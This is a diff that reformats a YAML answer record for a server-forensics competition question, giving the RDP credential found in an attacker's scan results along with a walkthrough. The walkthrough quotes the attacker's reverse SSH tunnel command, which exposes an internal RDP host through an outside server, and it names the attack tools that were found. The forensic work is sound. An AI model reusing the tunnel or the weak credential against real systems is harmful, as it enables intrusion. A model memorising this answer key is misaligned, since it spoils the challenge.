@@ -1,39 +1,38 @@
 meta:
-  competition: "2025pinghang"
-  question_id: "S13"
-  category: "S_server"
-  short_name: "RDP 扫描结果"
-  difficulty: "easy"
-  status: "solved"
-  confidence: "high"
-question:
-  raw: "攻击者使用工具对内网进行扫描后，rdp 扫描结果中的账号密码是什么（格式：abc:def）"
-answer:
-  value: "administrator:Aa123456@"
-  format_note: "kscan 扫到 192.168.100.254:3389 的 RDP 弱口令"
-walkthrough:
-  identify: |
-    /root/ 目录下含黑客工具：
+  competition: 2025pinghang
+  question_id: S13
+  category: S_server
+  short_name: RDP 扫描结果
+  difficulty: easy
+  status: solved
+  confidence: high
+  tags: [server_forensics]
+question: {raw: '攻击者使用工具对内网进行扫描后，rdp 扫描结果中的账号密码是什么（格式：abc:def）'}
+answer: {value: 'administrator:Aa123456@', format_note: 'kscan 扫到 192.168.100.254:3389
+    的 RDP 弱口令'}
+walkthrough: {identify: '/root/ 目录下含黑客工具：
+
     - kscan (6.9MB 内网扫描工具)
+
     - LinuxCheck (Linux 主机巡检脚本)
+
     - AndroRAT (Android RAT 服务端)
+
     - sfz.jpg (倩倩身份证照片)
+
     扫描结果保存在 /www/wwwroot/www.tpshop.com/application/result.txt
-  extract: "head -100 /www/wwwroot/www.tpshop.com/application/result.txt"
-  analyze: |
-    result.txt 末尾：
-    ------------------------------------rdp------------------------------------
-    [RDP] 192.168.100.254:3389       administrator:Aa123456@
-    
-    192.168.100.254 是 .bash_history 中 ssh 反向代理的目标：
-      ssh -CgfNR 0.0.0.0:22222:192.168.100.254:3389 root@222.2.2.2 -p33333
-    起早王把内网 RDP 通过 222.2.2.2:33333 暴露到外网 22222 端口。
-  verify: "FastPwds.txt 内字典含 Aa123456 系列"
-  command: |
-    grep RDP /mnt/server/www/wwwroot/www.tpshop.com/application/result.txt
+
+    ', extract: head -100 /www/wwwroot/www.tpshop.com/application/result.txt, analyze: "result.txt\
+    \ 末尾：\n------------------------------------rdp------------------------------------\n\
+    [RDP] 192.168.100.254:3389       administrator:Aa123456@\n\n192.168.100.254 是\
+    \ .bash_history 中 ssh 反向代理的目标：\n  ssh -CgfNR 0.0.0.0:22222:192.168.100.254:3389\
+    \ root@222.2.2.2 -p33333\n起早王把内网 RDP 通过 222.2.2.2:33333 暴露到外网 22222 端口。\n", verify: FastPwds.txt
+    内字典含 Aa123456 系列, command: 'grep RDP /mnt/server/www/wwwroot/www.tpshop.com/application/result.txt
+
+    '}
 integrity:
-  source: "/www/wwwroot/www.tpshop.com/application/result.txt"
+  source: /www/wwwroot/www.tpshop.com/application/result.txt
   external_access: false
-  tools: ["grep", "head"]
-  artifacts:
-    - "cases/2025平航杯/artifacts/s_recon5.sh"
+  tools: [grep, head]
+  artifacts: [cases/2025平航杯/artifacts/s_recon5.sh]
+tags: [server_forensics]
